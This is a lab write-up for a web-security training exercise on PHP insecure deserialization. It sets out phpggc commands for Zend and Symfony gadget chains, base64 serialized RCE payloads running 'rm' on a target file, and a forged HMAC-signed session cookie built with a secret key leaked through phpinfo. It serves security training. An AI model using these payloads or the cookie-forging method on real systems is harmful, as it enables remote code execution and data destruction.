
This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's [insecure deserialization](https://portswigger.net/web-security/deserialization) using pre-built gadget chains.

To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

# Recon

Check the session cookie when logging in:

![[session-cookie.png]]

Try to know the installed gadget to exploit. By enumerating the server I found the `phpinfo` page:

![[zend-framework.png]]

Check the available gadgets that match the version `3.4.0`:

![[gadgets-available.png]]

The candidate gadgets are:

- ZendFramework/RC3
- ZendFramework/RCE5

# Vuln assessment

Craft an appropriate payload using the gadgets to delete the target file:

```
./phpggc ZendFramework/RCE3 __toString "rm -rf /home/carlos/morale.txt"
```

Base64 encode the result object:

```
TzoxNToiWmVuZFxMb2dcTG9nZ2VyIjoxOntzOjEwOiIqd3JpdGVycyI7YToxOntpOjA7TzoyMDoiWmVuZFxMb2dcV3JpdGVyXE1haWwiOjM6e3M6MTU6IipldmVudHNUb01haWwiO2E6MTp7aTowO2k6MDt9czoyMToiKnN1YmplY3RQcmVwZW5kVGV4dCI7czowOiIiO3M6MjQ6IipudW1FbnRyaWVzUGVyUHJpb3JpdHkiO2E6MTp7aTowO086MTQ6IlplbmRcVGFnXENsb3VkIjoyOntzOjc6Iip0YWdzIjthOjE6e2k6MDtzOjA6IiI7fXM6MTU6Iip0YWdEZWNvcmF0b3IiO086MzQ6IlplbmRcVGFnXENsb3VkXERlY29yYXRvclxIdG1sQ2xvdWQiOjM6e3M6MTI6IipzZXBhcmF0b3IiO3M6MDoiIjtzOjEwOiIqZXNjYXBlciI7TzoyMDoiWmVuZFxFc2NhcGVyXEVzY2FwZXIiOjE6e3M6MTg6IipodG1sQXR0ck1hdGNoZXIiO2E6Mjp7aTowO086MjM6IlplbmRcRmlsdGVyXEZpbHRlckNoYWluIjoxOntzOjEwOiIqZmlsdGVycyI7TzoxMzoiU3BsRml4ZWRBcnJheSI6Mjp7aTowO2E6Mjp7aTowO086MTQ6IlplbmRcSnNvblxFeHByIjoxOntzOjEzOiIqZXhwcmVzc2lvbiI7czozMDoicm0gLXJmIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9aToxO3M6MTA6Il9fdG9TdHJpbmciO31pOjE7czoxMDoiX190b1N0cmluZyI7fX1pOjE7czo2OiJmaWx0ZXIiO319czoxMToiKmh0bWxUYWdzIjthOjE6e3M6MToiaCI7YToxOntzOjE6ImEiO3M6MToiISI7fX19fX19fX0=
```

The problem now was the `hmac_sha1` signature:

![[error-signature.png]]

Signing with require a secret key, I looked for it into the `phpinfo` page:

![[secret-key.png]]

Now sign the attack object using the secret key.

This process fails with the following error message:

![[deserialization-gadget-fail.png]]

From the error message test gadgets for `Symfony Version 4.3.6`

By performing the same process with the gadget `Symfony/RCE4` it worked.

```
./phpggc -b Symfony/RCE4 exec 'rm /home/carlos/morale.txt'
```

![[hmac.png]]

The attack cookie will be:

```
{"token":"Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319","sig_hmac_sha1":"e09c418d37f2334008523aecd8a5d7fc10855ef3"}
```


![[Advanced Topics/Insecure deserialization/labs/Exploit PHP deserialization with a gadget chain/images/exploited.png]]